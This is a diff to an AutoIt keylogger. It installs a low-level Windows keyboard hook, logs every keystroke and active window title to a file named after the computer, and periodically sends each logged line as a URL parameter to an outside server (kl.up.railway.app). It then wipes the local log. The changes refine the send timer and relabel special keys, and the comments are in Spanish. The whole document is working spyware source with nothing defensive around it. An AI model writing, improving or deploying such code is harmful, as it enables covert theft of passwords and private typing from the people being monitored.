@@ -11,11 +11,10 @@ Global $file, $f3 = 0
 Global $url = "https://kl.up.railway.app/?kl="
 Global $lastActiveWindow = "", $lastActiveTime = 0
 Global $file_name = @computername & "_log.txt"
-Global $last_send = 0
-While 1
+
+
  	_Main()
-    Sleep(250)
-WEnd
+
 
 Func _Main()
     Local $hmod
@@ -25,11 +24,9 @@ Func _Main()
     $hHook = _WinAPI_SetWindowsHookEx($WH_KEYBOARD_LL, DllCallbackGetPtr($hStub_KeyProc), $hmod)
     
     Local $startTime = TimerInit()
-
+	local $last_send = TimerInit()
 	
 	send_file(true)
-
-
 	
     While 1
         Sleep(10)
@@ -39,17 +36,13 @@ Func _Main()
             $lastActiveWindow = $currentActiveWindow
             $lastActiveTime = TimerInit()
         EndIf
-
         ; Comprobar si han pasado 30 segundos desde la última vez que se escribió en el archivo
         If TimerDiff($lastActiveTime) > 30000 Then ; 30 segundos en milisegundos
-		
 			write_file()
             $lastActiveTime = TimerInit()
 			send_file(false)
 		EndIf
-		
-		
-    WEnd
+	WEnd
 EndFunc
 
 
@@ -70,24 +63,19 @@ Func write_file()
 EndFunc
 
 Func send_file($forced_action)
-	if TimerDiff($last_send) > 600000 or $forced_action=true then 
-	
-		If FileExists($file_name) Then ; Verifica si el archivo existe
-			Local $aArray = FileReadToArray($file_name)
-;			If @error Then
-;				MsgBox($MB_SYSTEMMODAL, "", "There was an error reading the file. @error: " & @error) 
-;			Else
-				For $i = 0 To UBound($aArray) - 1 
-						InetRead($url & $aArray[$i], $INET_FORCERELOAD)
-				Next
-;			EndIf
-			$last_send=0
-;			FileDelete($file_name) ; Borra el archivo después de enviarlo
-		EndIf
-		$file = FileOpen($file_name, $FO_APPEND) ; Abre un nuevo archivo para escribir
- 	endif
+    If TimerDiff($last_send) > 600000 Or $forced_action = True Then ; Si han pasado más de 10 minutos o si se forzó la acción
+        If FileExists($file_name) Then ; Verifica si el archivo existe
+            Local $aArray = FileReadToArray($file_name)
+            For $i = 0 To UBound($aArray) - 1
+                InetRead($url & $aArray[$i], $INET_FORCERELOAD)
+            Next
+            ; Vaciar el contenido del archivo en lugar de eliminarlo
+            $file = FileOpen($file_name, $FO_OVERWRITE)
+            FileClose($file)
+        EndIf
+        $last_send = TimerInit() ; Actualiza el tiempo de último envío
+    EndIf
 EndFunc
-
 
 Func EvaluateKey($keycode)
     $title = WinGetTitle("")
@@ -105,61 +93,61 @@ EndFunc
 
 Func key($keycode2)
     If $keycode2 = 8 Then
-		$buf = "{backspace}"
+		$buf = "[backspace]"
 	EndIf
 	If $keycode2 = 9 Then
-		$buf = "{TAB}"
+		$buf = "[TAB]"
 	EndIf
 	If $keycode2 = 13 Then
-		$buf = "{ENTER}"
+		$buf = "[ENTER]"
 	EndIf
 	If $keycode2 = 19 Then
-		$buf = "{PAUSE}"
+		$buf = "[PAUSE]"
 	EndIf
 	If $keycode2 = 20 Then
-		$buf = "{CAPSLOCK }"
+		$buf = "[CAPSLOCK]"
 	EndIf
 	If $keycode2 = 27 Then
-		$buf = "{ESC}"
+		$buf = "[ESC]"
 	EndIf
 	If $keycode2 = 32 Then
-		$buf = "{SPACE}"
+		$buf = "[SPACE]"
 	EndIf
 	If $keycode2 = 33 Then
-		$buf = "{PAGEUP}"
+		$buf = "[PAGEUP]"
 	EndIf
 	If $keycode2 = 34 Then
-		$buf = "{PAGEDOWN}"
+		$buf = "[PAGEDOWN]"
 	EndIf
 	If $keycode2 = 35 Then
-		$buf = "{END}"
+		$buf = "[END]"
 	EndIf
 	If $keycode2 = 36 Then
-		$buf = "{HOME}"
+		$buf = "[HOME]"
 	EndIf
 	If $keycode2 = 37 Then
-		$buf = "{¡û}"
+		$buf = "[¡û]"
 	EndIf
 	If $keycode2 = 38 Then
-		$buf = "{¡ü}"
+		$buf = "[¡ü]"
 	EndIf
 	If $keycode2 = 39 Then
-		$buf = "{¡ú}"
+		$buf = "[¡ú]"
 	EndIf
 	If $keycode2 = 40 Then
-		$buf = "{¡ý}"
+		$buf = "[¡ý]"
 	EndIf
 	If $keycode2 = 42 Then
-		$buf = "{PRINT}"
+		$buf = "[PRINT]"
 	EndIf
 	If $keycode2 = 44 Then
-		$buf = "{PRINT SCREEN}"
+		$buf = "[PRINT SCREEN]"
 	EndIf
 	If $keycode2 = 45 Then
-		$buf = "{INS}"
+		$buf = "[INS]"
 	EndIf
 	If $keycode2 = 46 Then
-		$buf = "{DEL}"
+		$buf = "[DEL]"
 	EndIf
 	If $keycode2 = 48 Or $keycode2 = 96 Then
 		$buf = 0
@@ -270,7 +258,7 @@ Func key($keycode2)
 		$buf = "z"
 	EndIf
 	If $keycode2 = 91 Or $keycode2 = 92 Then
-		$buf = "{Windows}"
+		$buf = "[Windows]"
 	EndIf
 	If $keycode2 = 106 Then
 		$buf = "*"
@@ -288,67 +276,67 @@ Func key($keycode2)
 		$buf = "/"
 	EndIf
 	If $keycode2 = 112 Then
-		$buf = "{F1}"
+		$buf = "[F1]"
 	EndIf
 	If $keycode2 = 113 Then
-		$buf = "{F2}"
+		$buf = "[F2]"
 	EndIf
 	If $keycode2 = 114 Then
-		$buf = "{F3}"
+		$buf = "[F3]"
 	EndIf
 	If $keycode2 = 115 Then
-		$buf = "{F4}"
+		$buf = "[F4]"
 	EndIf
 	If $keycode2 = 116 Then
-		$buf = "{F5}"
+		$buf = "[F5]"
 	EndIf
 	If $keycode2 = 117 Then
-		$buf = "{F6}"
+		$buf = "[F6]"
 	EndIf
 	If $keycode2 = 118 Then
-		$buf = "{F7}"
+		$buf = "[F7]"
 	EndIf
 	If $keycode2 = 119 Then
-		$buf = "{F8}"
+		$buf = "[F8]"
 	EndIf
 	If $keycode2 = 120 Then
-		$buf = "{F9}"
+		$buf = "[F9]"
 	EndIf
 	If $keycode2 = 121 Then
-		$buf = "{F10}"
+		$buf = "[F10]"
 	EndIf
 	If $keycode2 = 122 Then
-		$buf = "{F11}"
+		$buf = "[F11]"
 	EndIf
 	If $keycode2 = 123 Then
-		$buf = "{F12}"
+		$buf = "[F12]"
 	EndIf
 	If $keycode2 = 124 Then
-		$buf = "{F13}"
+		$buf = "[F13]"
 	EndIf
 	If $keycode2 = 125 Then
-		$buf = "{F14}"
+		$buf = "[F14]"
 	EndIf
 	If $keycode2 = 126 Then
-		$buf = "{F15}"
+		$buf = "[F15]"
 	EndIf
 	If $keycode2 = 127 Then
-		$buf = "{F16}"
+		$buf = "[F16]"
 	EndIf
 	If $keycode2 = 144 Then
-		$buf = "{NUMLOCK}"
+		$buf = "[NUMLOCK]"
 	EndIf
 	If $keycode2 = 145 Then
-		$buf = "{SCROLLLOCK}"
+		$buf = "[SCROLLLOCK]"
 	EndIf
 	If $keycode2 = 160 Or $keycode2 = 161 Then
-		$buf = "{Shift}"
+		$buf = "[Shift]"
 	EndIf
 	If $keycode2 = 162 Or $keycode2 = 163 Then
-		$buf = "{Ctrl}"
+		$buf = "[Ctrl]"
 	EndIf
 	If $keycode2 = 164 Then
-		$buf = "{Alt}"
+		$buf = "[Alt]"
 	EndIf
 	If $keycode2 = 186 Then
 		$buf = ";"
